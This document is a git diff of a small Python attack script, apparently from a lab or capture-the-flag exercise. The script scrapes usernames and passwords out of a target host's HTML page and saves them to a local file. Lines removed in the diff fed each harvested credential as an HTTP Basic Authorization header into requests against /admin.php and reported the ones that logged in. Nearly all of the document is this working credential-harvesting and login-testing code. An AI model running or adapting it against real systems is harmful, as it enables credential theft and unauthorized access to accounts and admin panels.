@@ -1,8 +1,10 @@
+#!/usr/bin/env python3
+
 import socket
 import urllib.request
 import argparse
-import http_methods_scanner
 import base64
+
 
 class StatColours:
     OKGREEN = '\033[92m'
@@ -26,7 +28,7 @@ def write_html2file(fname, html_handle):
     with open(fname, "w+") as f:
         f.writelines(html_handle)
 
-def credentials_parser(html_file):
+def credentials_parser(html_file, cred_file):
     credentials={}
     login_open_tag = "<tr><td id=\"name\">"
     login_close_tag = "</td><td"
@@ -55,37 +57,37 @@ def credentials_parser(html_file):
         print(f"{StatColours.OKGREEN}[+] ", \
             f"credentials extracted successfully {StatColours.ENDC}")
         print(credentials)
-
-    return credentials
+    
+    
+    with open(cred_file, "w") as cf:
+        for key in credentials:
+            current_credential = key +':'+ credentials[key] + '\n'
+            cf.write(current_credential)
+    
+    return 0
 
 def main():
 
     parser = argparse.ArgumentParser()
     parser.add_argument('host', type=str)
+    parser.add_argument('credentials_file', type=str)
 
     args = parser.parse_args()
     host = args.host
+    cred_file = args.credentials_file
     url = "http://" + host
 
     html_file = "elearn.html"
-    port = 80
-    request_type = 'GET'
-    path = '/admin.php'
-    headers = {}    
 
+    #extract html file 
     html_body = get_read_html(url)
+    #save html file to locally 
     write_html2file(html_file, html_body)
-    credentials = credentials_parser(html_file)
+    #extract credentials from html file and save to local credentials file
+    credentials_parser(html_file, cred_file)
 
-    for key in credentials:
-        current_credential = (key + credentials[key]).encode('ascii')
-        base64_cred = base64.b64encode(current_credential)
-        headers ["Authorization"] = b"Basic " + base64_cred
-        #feed credentials stream into automatic GET request
-        res = http_methods_scanner.chk_ressource(host,port,\
-            request_type,path, headers)
-        if res == "success":
-            print("Credentials: ", current_credential)
+    return
+
 
 if __name__ == "__main__":
     main()
